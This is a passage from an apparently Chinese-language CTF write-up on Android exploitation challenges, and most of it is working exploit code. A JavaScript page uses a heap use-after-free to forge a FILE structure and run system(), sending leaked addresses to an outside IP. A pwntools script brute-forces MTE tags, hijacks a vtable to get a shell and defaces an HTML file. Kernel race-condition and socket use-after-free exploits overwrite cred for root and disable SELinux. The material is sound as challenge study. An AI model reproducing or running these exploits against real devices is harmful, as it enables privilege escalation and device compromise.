stringToHex(getPadding(0x18,&quot;b&quot;)) + p64(fake_vtable);   edit_hex(pre,payload);   payload = p64(system_addr) + p64(heap_addr + 0x10);   edit_hex(found,payload);   log(&quot;edit done&quot;);   //sleep(15000);   writefile(&quot;trigger&quot;);     &lt;/script&gt;&lt;/head&gt;  &lt;body&gt;  &lt;div&gt;haivk&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\nAndroid 12做法更加简单，找到相同指针的下标后，直接堆喷FILE结构体，泄漏地址后伪造FILE结构体中的指针。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var xhr = new XMLHttpRequest();        function stringToHex(str) &#123;           var val=&quot;&quot;;           for(var i = 0; i &lt; str.length; i++)&#123;              val += str.charCodeAt(i).toString(16).padStart(2,&#x27;0&#x27;);           &#125;           return val;       &#125;       function hexToString(hex) &#123;         var str = &#x27;&#x27;;         for (var i = 0; i &lt; hex.length; i += 2) &#123;            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));         &#125;         return str;       &#125;       var sleep = function(time) &#123;         var startTime = new Date().getTime() + parseInt(time, 10);          while(new Date().getTime() &lt; startTime) &#123;&#125;       &#125;;       function log(info) &#123;          xhr.open(&#x27;GET&#x27;, &#x27;http://47.109.49.88/&#x27; + info, true);          xhr.send();       &#125;         function add(index,size,key) &#123;            window._jsbridge.add(index,key,size);            //sleep(1000);       &#125;       function edit(index,content) &#123;            window._jsbridge.edit(index,stringToHex(content));            //sleep(500);       &#125;       function edit_hex(index,content) &#123;            window._jsbridge.edit(index,content);            //sleep(500);       &#125;       function show(index,size) &#123;            ans = window._jsbridge.show(index,size);            return ans;       &#125;               function del(index) &#123;            window._jsbridge.delete(index);            //sleep(500);       &#125;       function openfile(filename,mode) &#123;            window._jsbridge.openfile(filename,mode);            //sleep(500);       &#125;       function writefile(content) &#123;            window._jsbridge.writefile(stringToHex(content));            //sleep(500);       &#125;       function writefile_hex(content) &#123;            window._jsbridge.writefile(content);            //sleep(500);       &#125;       function readfile() &#123;            ans = window._jsbridge.readfile();            //sleep(500);            return ans;       &#125;       function closefile() &#123;            window._jsbridge.closefile();            //sleep(500);       &#125;       function getPadding(size,c) &#123;            var ans = &#x27;&#x27;;            for (var i=0;i&lt;size;i++) &#123;               ans += c;            &#125;            return ans;       &#125;       var heap_addr=null;       var elf_base=null;         function p32(value) &#123;          var t = value.toString(16);          while (t.length != 8) &#123;             t = &#x27;0&#x27; + t;          &#125;          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;       function p64(value) &#123;          var t = value.toString(16);          while (t.length != 16) &#123;             t = &#x27;0&#x27; + t;          &#125;          var ans = t.substr(14,2) + t.substr(12,2) + t.substr(10,2) + t.substr(8,2) + t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;       function u32(s) &#123;         hex = stringToHex(s);         if (hex.indexOf(&#x27;0x&#x27;) === 0) &#123;            hex = hex.slice(2);         &#125;         if (hex.length % 2 !== 0) &#123;            hex = &#x27;0&#x27; + hex;         &#125;         var bytes = [];         for (var i = 0; i &lt; hex.length; i += 2) &#123;            bytes.push(hex.substr(i, 2));         &#125;         bytes.reverse();         var littleEndianHex = bytes.join(&#x27;&#x27;);         return parseInt(littleEndianHex, 16);      &#125;       //添加一些0xac0的堆       for (var i=0;i&lt;32;i++) &#123;         add(i,0xac0-0x8,&quot;key&quot; + i);         edit(i,getPadding(0xac0-0x8,String.fromCharCode(48+i)))       &#125;       //释放一些0xac0的堆       for (var i=0;i&lt;32;i+=2) &#123;         del(i);       &#125;       //重新申请0xac0的堆回来       for (var i=32;i&lt;49;i++) &#123;         add(i,0xac0-0x8,&quot;key&quot; + i);       &#125;       //查找堆块，找出具有相同堆指针的下标       map = &#123;&#125;;       //寻找指针一样的下标       for (var i=0;i&lt;32;i+=2) &#123;         var x = stringToHex(getPadding(0x10,String.fromCharCode(48+i)));         for (var j=32;j&lt;49;j++) &#123;            var y = show(j,0x10);            //log(&quot;map &quot; + x  + &quot;=&quot; + y);            if (y == x) &#123;               map[i] = j;               log(&quot;map&quot; + i  + &quot;=&quot; + j);               break;            &#125;         &#125;       &#125;       //利用UAF释放，可以在具有相同指针的另一个下标进行UAF操作       for (var i=0;i&lt;32;i+=2) &#123;            if (map[i]) &#123;               del(i);            &#125;       &#125;       log(&quot;spray done&quot;);       //对FILE结构体进行堆喷，让其落在UAF的堆中       //这里不断的openfile，然后查找内存       //注意show的参数大小size也会申请内存，会造成影响       var found = -1;       var libc_base = -1;       var system_addr = -1;       var heap_addr = -1;       var leak;       for (var i=0;i&lt;100;i++) &#123;         openfile(&quot;spray_FILE&quot;,1);         //检查是否成功堆喷站位         for (var j in map) &#123;            var x = show(map[j],0x60);            //log(&quot;x=&quot; + x);            if ((x.substr(0x90,0x2) == &quot;58&quot; &amp;&amp; x.substr(0xa0,0x2) == &quot;d0&quot;)) &#123;               leak = hexToString(x);               //__sclose               libc_base = u32(leak.substr(0x48, 8)) - 0xA8C58;               system_addr = libc_base + 0x60CC4;               heap_addr = u32(leak.substr(0x8, 6) + &quot;\\0\\0&quot;);               found = map[j];               break;            &#125;         &#125;         if (found != -1) &#123;            break;         &#125;       &#125;       log(&quot;heap_addr=&quot; + heap_addr.toString(16));       log(&quot;libc_base=&quot; + libc_base.toString(16) + &quot;&amp;system_addr=&quot; + system_addr.toString(16));              //log(&quot;found=&quot; + found);   //成功堆喷FILE，接下来可以利用UAF进行泄漏和代码执行了   var payload = show(found,0x40);   payload += p64(heap_addr + 0x60)   payload += p64(system_addr);   payload += p64(0) + p64(0);   payload += p64(1);   payload += p64(heap_addr - 0x10);   payload += stringToHex(&#x27;log -t FLAG `cat /data/data/com.avss.testallocator/files/flag`&#x27;);   edit_hex(found,payload);   log(&quot;edit done&quot;);   //sleep(15000);   closefile();     &lt;/script&gt;&lt;/head&gt;  &lt;body&gt;  &lt;div&gt;haivk&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\nMTEHNS_PA_RWfree后没有清空指针，存在UAF\n\n\n内存分配器使用的是Chromium中的PartitionAlloc分配器，该分配器在free时会对内存TAG加1，申请时如果有合适空闲堆块则直接申请出来不改变TAG。因此连续的申请释放同样大小的堆15次，可以得到与最初的堆一样的TAG，就可以对其进行进行访问了。通过堆喷Node结构体到content区，然后利用UAF控制Node结构体实现任意地址读写。调试发现在heap_addr - 0x281f0处有so中的指针，因此可以利用任意地址读写泄漏，但是此处的内存TAG不知道。调试了内核，发现一个有趣的特性，一个非法的TAG内存地址不经过用户态处理，直接传给内核系统调用，不会导致系统崩溃，只会使得内核进行el异常，内核会自动捕捉该异常并结束系统调用回到用户态。\n而题目的show函数正好是这样设计的，直接把content指针交给了write系统调用。\n\n\n因此可以对heap_addr - 0x281f0处的内存地址TAG进行爆破。如果write成功调用证明TAG正确。最后可以对free函数的指针进行劫持实现代码执行。\n\n\n获得shell后，直接替换&#x2F;sdcard&#x2F;Documents&#x2F;cache.html文件即可达到演示效果。\n#coding:utf8from pwn import *#sh = process(argv=[&#x27;./qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./libpa.so&#x27;])libc = ELF(&#x27;./system/lib64/libc.so&#x27;)#sh = process(argv=[&#x27;./qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-g&#x27;,&#x27;1235&#x27;,&#x27;./libpa.so&#x27;])sh = remote(&#x27;192.168.10.16&#x27;,12345)#sh = remote(&#x27;172.20.10.6&#x27;,12345)#libc = ELF(&#x27;./libc11.so&#x27;)def add(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))add(0x18,&#x27;a&#x27;*0x18) #0add(0x40,&#x27;b&#x27;*0x40) #1delete(0)for i in range(2,16):   add(0x18,&#x27;b&#x27;*0x18)   delete(i)delete(1)#fake Node struct#set size = 0x20add(0x18,b&#x27;c&#x27;*0x8 + p32(0x20) + b&#x27;\\n&#x27;) #16for i in range(17,31):   add(0x18,b&#x27;d&#x27;*0x18)   delete(i)add(0x18,b&#x27;d&#x27;*0x18) #31show(0)sh.recv(1)sh.recv(0x10)heap_addr = u64(sh.recv(8)) &amp; 0xffffffffffffprint(&#x27;heap_addr=&#x27;,hex(heap_addr))leak_ptr_addr = heap_addr - 0x281f0print(&#x27;leak_ptr_addr=&#x27;,hex(leak_ptr_addr))#guess tagfor i in range(0x10):   #fake 31 Node struct   edit(0,b&#x27;a&#x27;*0x8 + p32(0x8) + p32(0) + p64((i &lt;&lt; 56) + leak_ptr_addr) + b&#x27;\\n&#x27;)   show(31)   sh.recv(1)   leak_value = u64(sh.recv(8))   if leak_value &amp; 0xFF == 0xdc:      print(&#x27;found TAG=&#x27;,hex(i))      breakelf_base = leak_value - 0x12adc# ldr x9, [x21] ldr x0, [x8] ; mov x1, x19 ; blr x9gadget_addr = elf_base + 0x9BC70putchar_got_addr = elf_base + 0xc44a8print(&#x27;elf_base=&#x27;,hex(elf_base))#leak libcedit(0,b&#x27;a&#x27;*0x8 + p32(0x8) + p32(0) + p64(putchar_got_addr) + b&#x27;\\n&#x27;)show(31)sh.recv(1)libc_base = u64(sh.recv(8)) - libc.sym[&#x27;putchar&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print(&#x27;libc_base=&#x27;,hex(libc_base))print(&#x27;system_addr=&#x27;,hex(system_addr))free_vtable_addr = elf_base + 0xCF148bss = elf_base + 0xCF2E0arg0_ptr_addr = elf_base + 0xcf000heap_arr_addr = elf_base + 0xCF188cmd = b&#x27;/bin/sh\\x00&#x27;#fake a vtableedit(0,b&#x27;a&#x27;*0x8 + p32(0x100) + p32(0) + p64(bss) + b&#x27;\\n&#x27;)edit(31,cmd.ljust(0x28,b&#x27;b&#x27;) + p64(system_addr) + b&#x27;\\n&#x27;)#set free vtable ptr to fakeedit(0,b&#x27;a&#x27;*0x8 + p32(0x100) + p32(0) + p64(free_vtable_addr) + b&#x27;\\n&#x27;)edit(31,p64(bss) + b&#x27;\\n&#x27;)#triggerdelete(31)sleep(1)#run shell to replace /sdcard/Documents/cache.htmlsh.sendline(&#x27;echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+SGFja2VkIGJ5IEhhMXZrPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBibGFjazsKICAgICAgICAgICAgY29sb3I6ICMwMGZmMDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQ291cmllciBOZXcnLCBDb3VyaWVyLCBtb25vc3BhY2U7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgfQogICAgICAgIGNhbnZhcyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogMDsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICB9CiAgICAgICAgLm1lc3NhZ2UgewogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogNTAlOwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgICAgICAgICBmb250LXNpemU6IDNyZW07CiAgICAgICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgICAgICB6LWluZGV4OiAxOwogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMHB4IDBweCA1cHggIzAwZmYwMDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgoKPGRpdiBjbGFzcz0ibWVzc2FnZSI+SGFja2VkIGJ5IEhhMXZrPC9kaXY+CjxjYW52YXMgaWQ9Im1hdHJpeENhbnZhcyI+PC9jYW52YXM+Cgo8c2NyaXB0PgogICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1hdHJpeENhbnZhcyIpOwogICAgY29uc3QgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgY2FudmFzLndpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICBjYW52YXMuaGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwoKICAgIGNvbnN0IGNoYXJhY3RlcnMgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpAIyQlXiYqKCkiOwogICAgY29uc3QgZm9udFNpemUgPSAxNjsKICAgIGNvbnN0IGNvbHVtbnMgPSBjYW52YXMud2lkdGggLyBmb250U2l6ZTsKCiAgICBjb25zdCBkcm9wcyA9IFtdOwogICAgZm9yIChsZXQgeCA9IDA7IHggPCBjb2x1bW5zOyB4KyspIHsKICAgICAgICBkcm9wc1t4XSA9IE1hdGgucmFuZG9tKCkgKiBjYW52YXMuaGVpZ2h0OwogICAgfQoKICAgIGZ1bmN0aW9uIGRyYXcoKSB7CiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICJyZ2JhKDAsIDAsIDAsIDAuMDUpIjsKICAgICAgICBjdHguZmlsbFJlY3QoMCwgMCwgY2FudmFzLndpZHRoLCBjYW52YXMuaGVpZ2h0KTsKCiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICIjMDBmZjAwIjsKICAgICAgICBjdHguZm9udCA9IGZvbnRTaXplICsgInB4IG1vbm9zcGFjZSI7CgogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZHJvcHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgY29uc3QgdGV4dCA9IGNoYXJhY3RlcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogY2hhcmFjdGVycy5sZW5ndGgpXTsKICAgICAgICAgICAgY3R4LmZpbGxUZXh0KHRleHQsIGkgKiBmb250U2l6ZSwgZHJvcHNbaV0gKiBmb250U2l6ZSk7CgogICAgICAgICAgICBpZiAoZHJvcHNbaV0gKiBmb250U2l6ZSA+IGNhbnZhcy5oZWlnaHQgJiYgTWF0aC5yYW5kb20oKSA+IDAuOTc1KSB7CiAgICAgICAgICAgICAgICBkcm9wc1tpXSA9IDA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGRyb3BzW2ldKys7CiAgICAgICAgfQogICAgfQoKICAgIHNldEludGVydmFsKGRyYXcsIDMzKTsKCiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigncmVzaXplJywgKCkgPT4gewogICAgICAgIGNhbnZhcy53aWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwogICAgICAgIGNhbnZhcy5oZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICB9KTsKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d &gt; /sdcard/Documents/cache.html&#x27;)sleep(2)sh.interactive()\n\nkSysRaceAndroid 10利用gadget构造任意读写原语，直接搜索cred结构体然后修改\n#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sched.h&gt;#include &lt;stdint.h&gt;#include &lt;pthread.h&gt;#include &lt;linux/keyctl.h&gt;#define __NR_race 604#define pause() &#123;write(STDOUT_FILENO, &quot;[*] Paused (press enter to continue)\\n&quot;, 37); getchar();&#125;// #define DB_STACK_ADDR 0xfffffe0000010f30typedef struct mystruct &#123;    size_t  size;    char buffer[0];&#125;mystruct;size_t race(mystruct *userkey, char *buffer, unsigned long len, char *userhmac)&#123;    return syscall(__NR_race, userkey, buffer, len, userhmac);&#125;void err_msg(char *msg)&#123;    printf(&quot;\\033[31m\\033[1m[!] %s \\033[0m\\n&quot;,msg);    exit(0);&#125;void output_msg(char *msg)&#123;    printf(&quot;\\033[34m\\033[1m[+] %s \\033[0m\\n&quot;,msg);&#125;void print_addr(char *msg, size_t value)&#123;    printf(&quot;\\033[35m\\033[1m[*] %s == %p\\033[0m\\n&quot;,msg,(size_t *)value);&#125;void bind_core(int core)&#123;    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(core, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    output_msg(&quot;Process binded to core&quot;);&#125;int status = 1;char buf_userkey[0x1000];char hmac[20] = &#123;0&#125;;char ptext[0x1000] = &#123;0&#125;;mystruct *userkey = buf_userkey;pthread_t raceFunc;size_t core_pattern = 0xFFFFFF8008DEE930;size_t selinux_enforcing = 0xFFFFFF8008EDA770;size_t gadget_write = 0xFFFFFF8008131E60;//ldr x0, [x0, #0x100] ; retsize_t gadget_read = 0xffffff8008099fcc;size_t cryptoctx_getbits = 0xFFFFFF80080DB018;size_t bss = 0xFFFFFF8008E92200;size_t work_for_cpu_fn = 0xFFFFFF80080D000C;size_t selnl_notify_setenforce = 0xFFFFFF80083EF928;size_t selinux_status_update_setenforce = 0xFFFFFF80083FF540;/*.kernel:FFFFFF8008707744                 LDRB            W8, [X0,#0x311].kernel:FFFFFF8008707748                 MOV             X19, X0.kernel:FFFFFF800870774C                 ADD             X29, SP, #0x10.kernel:FFFFFF8008707750                 CBZ             W8, loc_FFFFFF8008707774.kernel:FFFFFF8008707754                 LDR             X8, [X19,#0x338].kernel:FFFFFF8008707758                 CBZ             X8, loc_FFFFFF8008707764.kernel:FFFFFF800870775C                 ADD             X0, X19, #0x318.kernel:FFFFFF8008707760                 BLR             X8 */size_t mov_x19_gadget = 0xFFFFFF8008707744;/*.kernel:FFFFFF80080DB3F8                 LDR             X8, [X19,#0xC8].kernel:FFFFFF80080DB3FC                 MOV             X0, X22.kernel:FFFFFF80080DB400                 MOV             X1, X21.kernel:FFFFFF80080DB404                 MOV             X2, X20.kernel:FFFFFF80080DB408                 BLR             X8.kernel:FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0].kernel:FFFFFF80080DB410                 MOV             X20, X0.kernel:FFFFFF80080DB414                 MOV             X0, X19.kernel:FFFFFF80080DB418                 BLR             X8.kernel:FFFFFF80080DB41C                 SXTW            X0, W20.kernel:FFFFFF80080DB420.kernel:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j.kernel:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0].kernel:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10].kernel:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20].kernel:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30].kernel:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50.kernel:FFFFFF80080DB434                 RET*/size_t gadget2 = 0xFFFFFF80080DB3F8;size_t ret = 0xFFFFFF80080DB434;/*.kernel:FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0].kernel:FFFFFF80080DB410                 MOV             X20, X0.kernel:FFFFFF80080DB414                 MOV             X0, X19.kernel:FFFFFF80080DB418                 BLR             X8.kernel:FFFFFF80080DB41C                 SXTW            X0, W20.kernel:FFFFFF80080DB420.kernel:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j.kernel:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0].kernel:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10].kernel:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20].kernel:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30].kernel:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50.kernel:FFFFFF80080DB434                 RET*/size_t gadget3 = 0xFFFFFF80080DB40C;//size_t mov_x0_zero = 0xffffff800809cc8c;#define INIT_TASK 0xFFFFFF8008DBAF80#define TASK_OFFSET 0x4a8#define PID_OFFSET 0x5a8#define PTR_CRED_OFFSET 0x748void competeFunc() &#123;    while(status) &#123;        // printf(&quot;I&#x27;m child thread\\n&quot;);        userkey-&gt;size = 0x10;    &#125;&#125;size_t exec_func(size_t func,size_t arg,int check_ret,int ret_val) &#123;    *(size_t *)&amp;userkey-&gt;buffer[0x10] = cryptoctx_getbits;    *(size_t *)&amp;userkey-&gt;buffer[0x18] = mov_x19_gadget;    status = 1;    if (pthread_create(&amp;raceFunc,NULL,competeFunc,NULL) &lt; 0)&#123;        err_msg(&quot;Fail to create thread\\n&quot;);    &#125;        size_t t0 = time(NULL);    size_t ret = 0;    while (1) &#123;        *(char *)(ptext + 0x311) = 1;        *(size_t *)(ptext + 0x338) = gadget2;        *(size_t *)(ptext + 0xc8) = mov_x0_zero;        *(size_t *)(ptext + 0xd0) = work_for_cpu_fn;        *(size_t *)(ptext + 0x20) = func;        *(size_t *)(ptext + 0x28) = arg;        userkey-&gt;size = 0x20;        race(userkey, ptext, 0x340, hmac);        if (check_ret) &#123;            if (*(size_t *)(ptext + 0x30) &gt;&gt; 48 == ret_val) &#123;                ret = *(size_t *)(ptext + 0x30);                break;            &#125;        &#125; else &#123;            //不能判断是否竞争成功，直接每个运行6秒            if (time(NULL) - t0 &gt; 6) &#123;                break;            &#125;        &#125;    &#125;    status = 0;    return ret;&#125;size_t read_qword(size_t addr,size_t check_val) &#123;    *(size_t *)&amp;userkey-&gt;buffer[0x10] = cryptoctx_getbits;    *(size_t *)&amp;userkey-&gt;buffer[0x18] = mov_x19_gadget;    status = 1;    if (pthread_create(&amp;raceFunc,NULL,competeFunc,NULL) &lt; 0)&#123;        err_msg(&quot;Fail to create thread\\n&quot;);    &#125;        size_t t0 = time(NULL);    size_t ret = 0;    while (1) &#123;        *(char *)(ptext + 0x311) = 1;        *(size_t *)(ptext + 0x338) = gadget2;        *(size_t *)(ptext + 0xc8) = mov_x0_zero;        *(size_t *)(ptext + 0xd0) = work_for_cpu_fn;        *(size_t *)(ptext + 0x20) = gadget_read;        *(size_t *)(ptext + 0x28) = addr - 0x100;        userkey-&gt;size = 0x20;        race(userkey, ptext, 0x340, hmac);                if ((*(size_t *)(ptext + 0x30) &gt;&gt; 48) == check_val) &#123;            ret = *(size_t *)(ptext + 0x30);            break;        &#125;    &#125;    status = 0;    return ret;&#125;void write_qword(size_t addr,size_t val) &#123;    *(size_t *)&amp;userkey-&gt;buffer[0x10] = cryptoctx_getbits;    *(size_t *)&amp;userkey-&gt;buffer[0x18] = mov_x19_gadget;        status = 1;    if (pthread_create(&amp;raceFunc,NULL,competeFunc,NULL) &lt; 0)&#123;        err_msg(&quot;Fail to create thread\\n&quot;);    &#125;        size_t t0 = time(NULL);    while (1) &#123;        *(char *)(ptext + 0x311) = 1;        *(size_t *)(ptext + 0x338) = gadget3;        *(size_t *)(ptext + 0xd0) = gadget_write;        *(size_t *)(ptext + 0x20) = addr;        *(size_t *)(ptext + 0) = val;        userkey-&gt;size = 0x20;        race(userkey, ptext, 0x340, hmac);        //不能判断是否竞争成功，直接每个运行6秒        if (time(NULL) - t0 &gt; 6) break;    &#125;    status = 0;&#125;size_t get_current_task() &#123;    size_t task = INIT_TASK;    size_t result = 0;    int i = 0;    int pid;    int current_task_pid = getpid();    while(result == 0 &amp;&amp; i++ &lt; 1000) &#123;        task = read_qword(task + TASK_OFFSET,0xffff) - TASK_OFFSET;        printf(&quot;task: %#lx\\n&quot;, task);        if(task == INIT_TASK) &#123;            break;        &#125;        pid = read_qword(task + PID_OFFSET,0) &amp; 0xFFFFFFFF;        printf(&quot;pid: %d\\n&quot;, pid);        if(pid == current_task_pid) &#123;            result = task;        &#125;    &#125;    return result;&#125;int main()&#123;    int ret;    bind_core(0);    memcpy(userkey-&gt;buffer, &quot;1234567890abcdef&quot;, 0x10);    memcpy(ptext, &quot;This is a test message. &quot;, 0x20);    size_t current_task = get_current_task();    printf(&quot;current_task_addr=0x%lx\\n&quot;,current_task);    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET,0xffff);    printf(&quot;current_cred: 0x%lx\\n&quot;, current_cred);    for(int i = 0; i &lt; 8; i ++) &#123;        //gadget的val不能为0，所以错位写入0        write_qword(current_cred + 4 + i * 4, 0xFFFFFFFF00000000);    &#125;    system(&quot;/bin/sh&quot;);    return 0;&#125;\n\nKernel: ksocketAndroid 7 - Pixel 1在sys_avss_getscore函数中，fput的位置不对，在fput的后面，此时如果有其他进程对sockfd进行close，将会释放sock * sk对象，但是sk指针仍然会在后面的代码中使用，造成UAF。为了让漏洞竞争成功率更高，可以让程序走到msleep分支。要走到此分支，需要get_avss_status返回2\n\n\n即需要avss-&gt;peer不为空。\n\n\n也就是有一个客户端client，对server进行connect后，server-&gt;peer &#x3D; client;只要不对client进行close，则server-&gt;peer将一直不为0。因此我们有足够的时间可以制造sock *对象的UAF，然后利用setxattr伪造sock *对象。\nsys_avss_getscore函数尾部主要是调用了sock_put(sk)。\n\n\n通过对sock_put的逆向，调用链有sock_put -&gt; sk_free -&gt; __sk_free，其中__sk_free中有一个函数指针调用\n\n\n我们可以寻找合适的gadget，执行kernel_setsockopt，我们的目标是执行kernel_setsockopt中的set_fs(KERNEL_DS)，但是不要执行尾部的set_fs(oldfs)。\n\n\n这就需要伪造sock-&gt;ops-&gt;setsockopt为其他合适的gadget。由于ARM64的特性，BLR并不会将返回地址压栈溢，因此只需要再调用一层同样栈大小的函数__sk_backlog_rcv，该函数可以进一步执行一个新的函数指针。只需要在该函数内部执行add rsp , xxxx ; ret调整栈，ret会返回到__sk_backlog_rcv，此时__sk_backlog_rcv的栈与kernel_setsockopt的栈是同一个，__sk_backlog_rcv会直接返回到kernel_setsockopt的上层__sk_free，因此绕过了kernel_setsockopt尾部的set_fs(old_fs)。\n\n\n函数执行完后会一路返回到用户态。由于set_fs(old_fs)没有执行，此时用户态可以直接读写内核地址空间。任意地址读写原语如下。\nint read_at_address_pipe(void* address, void* buf, ssize_t len) &#123;    int ret = 1;    int pipes[2];    if(pipe(pipes))    return 1;    if(write(pipes[1], address, len) != len)        goto end;    if(read(pipes[0], buf, len) != len)        goto end;    ret = 0;end:    close(pipes[1]);    close(pipes[0]);    return ret;&#125;int write_at_address_pipe(void* address, void* buf, ssize_t len) &#123;    int ret = 1;    int pipes[2];    if(pipe(pipes))    return 1;    if(write(pipes[1], buf, len) != len)        goto end;    if(read(pipes[0], address, len) != len)        goto end;    ret = 0;end:    close(pipes[1]);    close(pipes[0]);    return ret;&#125;\n\n搜索cred结构体然后直接改写uid等字段实现root，通过任意地址读写，改写selinux_enforcing为0，关闭selinux。\n#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;netinet/in.h&gt;#include &lt;linux/socket.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sched.h&gt;#define AF_AVSS 1024#define AVSS_PORT 2024/*my custom kerneluint64_t kernel_setsockopt = 0xFFFFFFC0004E3F70;uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC0007A70B8;uint64_t add_sp_40_ret = 0xFFFFFFC0004EB048;#define INIT_TASK 0xFFFFFFC00089A1E0#define TASK_OFFSET 0x240#define PID_OFFSET 0x300#define PTR_CRED_OFFSET 0x498*///pixel 1 kerneluint64_t kernel_setsockopt = 0xFFFFFFC000C402FC;uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC00106D740;uint64_t add_sp_40_ret = 0xffffffc0000954fc;size_t selinux_enforcing = 0xFFFFFFC001716ACC;#define INIT_TASK 0xFFFFFFC001522120#define TASK_OFFSET 0x3a8#define PID_OFFSET 0x468#define PTR_CRED_OFFSET 0x610struct avss_addr &#123;    sa_family_t avss_family;    uint16_t year;    uint32_t id;&#125; __attribute__((packed));struct avss_data &#123;    uint8_t score;    char buff[128];&#125; __attribute__((packed));int create_server(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (bind(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;        